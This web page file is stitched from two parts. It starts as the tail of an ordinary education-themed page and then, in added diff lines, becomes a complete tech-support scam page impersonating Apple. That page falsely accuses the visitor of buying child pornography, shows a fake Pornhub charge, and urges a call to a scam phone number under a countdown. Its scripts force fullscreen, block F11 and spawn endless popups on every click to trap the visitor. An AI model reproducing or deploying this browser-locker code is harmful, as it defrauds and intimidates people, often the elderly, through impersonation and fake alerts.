class="title-CgfZVSrjGV"><div class="row-vAjBHiIitVbS"><span class="subject-laMJfjOihvswj">31 March 2025</span></div></div><div class="row-gyApJoMmPCdYtDR"><div class="more-KkRpJtiyIRRDKsTj"><span class="text-qxhSUJ">Michael Thompson</span></div></div></div><div class="tip-ZkCCmtcJahkT"><a href="themelist7.html" class="tagline-MgpzWQ"><span class="lg-HWlSXxVI">Show all</span></a><a href="index.php" class="title-AdjYtoQttqinF"><span class="box-SwCrVWhJyt">Share</span></a></div><div class="thumb-ZLJTtDkWNCxSdN"><h5 class="subtitle-zUQXKYFQbP">Harnessing Technology for Enhanced Learning Experiences</h5><div class="box-oPTPFCYOTeRtbmdR"><span class="lg-HQuhASUezzUomC">Research Study An Reading Curriculum Examination exploration Certification Innovation of how technology is transforming Skills education, Learning Writing Teaching improving Literacy student engagement, and fostering personalized Knowledge Training learning. Academic</span></div></div></div><div class="caption-BZfSKY"><div class="xs-xBSFjxhCunBW"><img src="./img/bf37779317389ba615904cadec9a677c4bf7bec6.jpg" class="wrapper-ACzUsELUMfLB"/></div></div></div></div></div><div class="tagline-UDfESjUlJQh"><div class="grid-BZvQzLjR"><div class="image-mRLGneNsYMVUthFZ"><h3 class="large-GonFUJ">Write to Us</h3></div></div><form action="undefined" class="lg-QhASNi"><input placeholder="Whatsapp number" class="icon-yMZjcZ"/><button type="submit" class="content-mukHITGCsioEW">Offer</button></form></div></main><footer class="xl-tTziMByx"><div class="container-MNrCdkUKebWMyw"><a href="./privacy_policy.html" class="control-MYQnSmCvvafuu">Privacy Policy</a><a href="./terms_of_use.html" class="button-yAdKXBGz">Terms Of Use</a><a href="./cookie_policy.html" class="breadcrumbs-avbmQmbHdiNsXjhh">Cookies Policy</a></div></footer><input type="checkbox" id="close" class="preview-RcPjswodJaDq"/><section class="img-anyoYwEIbXWA"><div class="grid-IHXIWtRLQxrtjZRj"><div class="userpic-hQkQjyhqTxm"><label for="close" class="sidebar-TzoFiqgorQIzSsi"><span class="content-VlhBfjYTPChhFbu">Deny all</span></label></div><div class="page-tlbvKXwSUTCzIKJg"><label for="close" class="content-azQqJABacX"><span class="image-uxzZECLh">Admit all</span></label></div></div><div class="userpic-TuzwAPMOgnVcrWZ"><span class="big-WbaoYk">This site uses cookies to help personalise content, tailor your experience and to keep you logged in if you register.<br>By continuing to use this site, you are consenting to our use of cookies. Learn more.</span></div></section></body></html>
+  
+
+</head>
+
+<body onclick="playSound()"  id="link">
+    <!-- Click overlay - only active when needed -->
+    <div id="clickOverlay" class="click-overlay"></div>
+
+        
+    <div class="bgimg">
+          <img src="images/bg.jpg" alt="" width="100%">
+        </div>
+
+
+    <div class="main">
+        
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-content">
+                        
+                        <div class="alert-box">
+                            
+
+    <div class="spacbar">
+        <div class="d-flex justify-content-between">
+  <div><img src="images/applelogo2.png" alt="" style="width: 30px;margin-right: 5px;"> Alert</div>
+  <div><a href="#" style="font-size: 15px;">Apple Support</a></div>
+</div>
+<img src="images/arror.jpg" alt="" style="width:80px;display: block;margin: 10px auto 0;text-align: center;">
+    <div class="alert-title">Your iPhone has been locked due to suspicious activity.</div>
+    <div class="alert-texts">
+        <div class="bgblue"><strong>Transaction of $569.90 via Apple Pay for Child Pornography was found.</strong> <br>For security reasons you are prohibited from using your device.</div>
+    <div class="txstm"> <br>
+        Not you? Call <strong>Apple Support: <br><a href="tel:+1-877-470-3432">+1-877-470-3432</a></strong> to unlock your device.
+     </div>
+    <a href="tel:+1-877-470-3432" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
+    
+    </div>
+</div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <div class="notification">
+        <div class="msalogo"><img src="images/messages.svg" alt="" width="30px"> MESSAGES</div>
+<div class="cursor">now</div>
+  <div class="notification-header">Payment Successful</div>
+  <div class="notification-body">
+    Sent $569.90 via Apple Pay to Pornhub <br>Premium.
+    Not you? Call +1-877-470-3432
+  </div>
+  <img src="images/apple_pay.png" alt="Apple Pay" class="apple-pay">
+</div>
+
+    <div id="modalContainer"></div>
+
+    <!-- Main Modal -->
+    <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-30px!important;">
+
+        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
+            <div class="modal-content">
+                <div class="modal-body text-center">
+                    <div class="alert-text">
+                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-877-470-3432">+1-877-470-3432</a> to unlock it!
+                    </div>
+
+                    
+                    <div class="text-end gap-4 mt-3 actionbtn">
+                        <a href="tel:+1-877-470-3432" class="me-2 bg-primary">Call +1-877-470-3432</a>
+                        <a href="tel:+1-877-470-3432" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <audio id="clickSound" src="media/LhlCcb3bW5w3.mp3" preload="auto" loop></audio>
+
+<script>
+function playSound() {
+  const audio = document.getElementById("clickSound");
+//   audio.currentTime = 0; // restart sound if clicked again
+  audio.play();
+}
+</script>
+    <!-- Bootstrap & Popper.js -->
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+
+
+<script>
+let timeLeft = 10 * 60;
+
+const display = document.getElementById("countdown");
+
+const timer = setInterval(() => {
+  let minutes = Math.floor(timeLeft / 60);
+  let seconds = timeLeft % 60;
+
+  display.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+
+  if (timeLeft <= 0) {
+    clearInterval(timer);
+    display.textContent = "Time's up!";
+  }
+
+  timeLeft--;
+}, 1000);
+</script>
+
+
+<script>
+
+
+
+    let modalCount = 0;
+    const maxModals = Infinity;
+    let fullScreenTriggered = false;
+
+    // Function to trigger full screen
+    function triggerFullScreen() {
+        const elem = document.documentElement;
+        if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {
+                    console.error('Fullscreen error:', err);
+                });
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            }
+        }
+    }
+
+    // Function to exit fullscreen
+    function exitFullScreen() {
+        if (document.exitFullscreen) {
+            document.exitFullscreen();
+        } else if (document.webkitExitFullscreen) {
+            document.webkitExitFullscreen();
+        } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+        }
+    }
+
+    // Function to generate random position within viewport
+    function getRandomPosition(modalWidth, modalHeight) {
+        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
+        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
+
+        if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
+            return {
+                top: Math.max(0, (viewportHeight - modalHeight) / 2),
+                left: Math.max(0, (viewportWidth - modalWidth) / 2)
+            };
+        }
+
+        const maxX = viewportWidth - modalWidth;
+        const maxY = viewportHeight - modalHeight;
+
+        const randomX = Math.floor(Math.random() * (maxX + 1));
+        const randomY = Math.floor(Math.random() * (maxY + 1));
+
+        return { top: randomY, left: randomX };
+    }
+
+    // Function to create a new modal with random position
+    function createNewModal() {
+        if (modalCount >= maxModals) return null;
+
+        modalCount++;
+
+        const newModal = document.createElement('div');
+        newModal.className = 'modal fade modal-stack';
+        newModal.id = `appleAlertModal-${modalCount}`;
+        newModal.tabIndex = -1;
+        newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
+        newModal.setAttribute('aria-hidden', 'true');
+
+        newModal.innerHTML = `
+            <div class="modal-dialog modal-lg positioned">
+                <div class="modal-content" id="applealertmodeltwo">
+                    <div class="modal-body text-center">
+                        <div class="alert-text">
+                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-877-470-3432">+1-877-470-3432</a> to unlock it!
+                        </div>
+
+                        
+                        <div class="text-end gap-4 mt-3 actionbtn">
+                            <a href="tel:+1-877-470-3432" class="me-2 bg-primary">Call +1-877-470-3432</a>
+                            <a href="tel:+1-877-470-3432" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        document.getElementById('modalContainer').appendChild(newModal);
+
+        const modal = new bootstrap.Modal(newModal, {
+            backdrop: 'static',
+            keyboard: false
+        });
+
+        const modalDialog = newModal.querySelector('.modal-dialog');
+        let modalWidth, modalHeight;
+
+        modalWidth = Math.min(600, window.innerWidth * 0.9);
+        modalHeight = window.innerWidth <= 576 ? 250 : 400;
+
+        const { top, left } = getRandomPosition(modalWidth, modalHeight);
+        modalDialog.style.top = `${top}px`;
+        modalDialog.style.left = `${left}px`;
+
+        if (window.innerWidth <= 576) {
+            modalDialog.style.width = `${modalWidth}px`;
+            modalDialog.style.maxWidth = 'none';
+        }
+
+        newModal.style.zIndex = 1080 + modalCount;
+        modal.show();
+
+        // Ensure tel: link actually triggers phone call
+        newModal.querySelectorAll('.tel-link').forEach(link => {
+            link.addEventListener('click', (e) => {
+                window.location.href = link.getAttribute('href');
+            });
+        });
+
+        // return modal;
+    }
+
+    // Initialize the first modal
+    const appleAlertModal = new bootstrap.Modal(document.getElementById('appleAlertModal'), {
+        backdrop: 'static',
+        keyboard: false
+    });
+
+    document.addEventListener('DOMContentLoaded', function () {
+        appleAlertModal.show();
+    });
+
+    // Add event listener to body for fullscreen and modal creation
+    document.body.addEventListener('click', () => {
+        triggerFullScreen();
+        createNewModal();
+    });
+
+    // On ESC â†’ exit fullscreen
+    document.addEventListener("keydown", function (e) {
+        if (e.key === "Escape") {
+            exitFullScreen();
+        }
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    document.addEventListener("keyup", function (e) {
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    // If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
+    document.addEventListener("fullscreenchange", () => {
+        if (!document.fullscreenElement) {
+            // User exited fullscreen
+            document.body.addEventListener("click", triggerFullScreen, { once: true });
+        }
+    });
+
+    window.addEventListener('resize', function () {
+        const modals = document.querySelectorAll('.modal-stack .modal-dialog.positioned');
+
+        modals.forEach(modal => {
+            const viewportHeight = window.innerHeight;
+            const modalHeight = modal.offsetHeight;
+            let { top } = getRandomPosition(modal.offsetWidth, modalHeight);
+
+            if (top + modalHeight > viewportHeight) {
+                top = Math.max(0, viewportHeight - modalHeight);
+            }
+
+            modal.style.top = `${top}px`;
+            modal.style.left = `0`;
+            modal.style.width = `100%`;
+            modal.style.maxHeight = `${viewportHeight}px`;
+            modal.style.overflow = `hidden`;
+        });
+    });
+</script> 
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+
+
+</body></html>
